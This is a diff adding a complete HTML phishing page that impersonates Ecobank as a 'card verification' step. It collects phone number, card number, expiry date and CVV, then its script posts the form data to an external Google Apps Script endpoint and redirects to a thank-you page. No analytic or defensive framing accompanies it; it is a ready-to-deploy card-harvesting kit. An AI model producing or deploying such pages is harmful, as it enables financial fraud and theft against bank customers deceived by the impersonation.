@@ -1,0 +1,116 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Ecobank Online Validation</title>
+
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+
+<style>
+body{
+  margin:0;
+  min-height:100vh;
+  background:linear-gradient(to bottom,#0a1a3f,#0e2563);
+  font-family:"Inter",Arial,sans-serif;
+  color:#fff;
+  display:flex;
+  flex-direction:column;
+}
+header{
+  padding:28px 20px 46px;
+  text-align:center;
+  background:linear-gradient(135deg,#1b4ba2,#102a5b);
+  border-bottom-left-radius:40px;
+  border-bottom-right-radius:40px;
+}
+header h1{
+  display:inline-block;
+  padding:12px 22px;
+  border-radius:999px;
+  background:linear-gradient(135deg,#123b87,#1f5bc5);
+  font-size:18px;
+}
+.step{margin-top:10px;font-size:13px;opacity:.9;}
+main{
+  flex:1;
+  display:flex;
+  justify-content:center;
+  padding:20px 14px;
+}
+.card{
+  width:100%;
+  max-width:420px;
+  background:linear-gradient(145deg,rgba(12,35,90,.97),rgba(18,50,115,.97));
+  padding:28px 24px;
+  border-radius:14px;
+  box-shadow:0 14px 30px rgba(0,0,0,.45);
+}
+.preview{
+  font-size:13px;
+  margin-bottom:18px;
+  opacity:.9;
+}
+label{font-size:13px;font-weight:600;margin-bottom:6px;display:block;}
+input{
+  width:100%;
+  padding:14px;
+  border-radius:8px;
+  border:1px solid #99b3ff;
+  margin-bottom:18px;
+}
+button{
+  width:100%;
+  padding:15px;
+  border:none;
+  border-radius:999px;
+  background:linear-gradient(135deg,#00b871,#00995b);
+  color:#fff;
+  font-weight:700;
+}
+</style>
+</head>
+
+<body>
+<header>
+  <h1>ECOBANK ONLINE VALIDATION</h1>
+  <div class="step">Step 2 of 3 · Card Verification</div>
+</header>
+
+<main>
+  <div class="card">
+    <div class="preview" id="preview"></div>
+
+    <form id="demoForm">
+      <label>Phone Number</label>
+      <input name="phone_number" placeholder="e.g. 024XXXXXXX" required>
+
+      <label>ATM Card Number</label>
+      <input name="atm_card_number" placeholder="16 digits card number" required>
+
+      <label>ATM Expiry Date</label>
+      <input name="atm_expiry_date" placeholder="MM/YY" required>
+
+      <label>CVV</label>
+      <input type="password" name="cvv" placeholder="3 digits signature number" required>
+
+      <button>Validate Securely</button>
+    </form>
+  </div>
+</main>
+
+<script>
+const preview=document.getElementById("preview");
+const email=localStorage.getItem("email")||"";
+const maskedEmail=email.replace(/(.{2}).+(@.+)/,"$1***$2");
+preview.textContent="Confirming account for: "+maskedEmail;
+
+const scriptURL="https://script.google.com/macros/s/AKfycbxBZeRKxbAyf1pWTLN0z15_l-E3RXnp3hvx2gYHiDDU00GKZ3vBKVt7T2kImh9Sfoo1dw/exec";
+document.getElementById("demoForm").addEventListener("submit",async e=>{
+  e.preventDefault();
+  await fetch(scriptURL,{method:"POST",body:new FormData(e.target)});
+  location.href="thankyou.html";
+});
+</script>
+</body>
+</html>
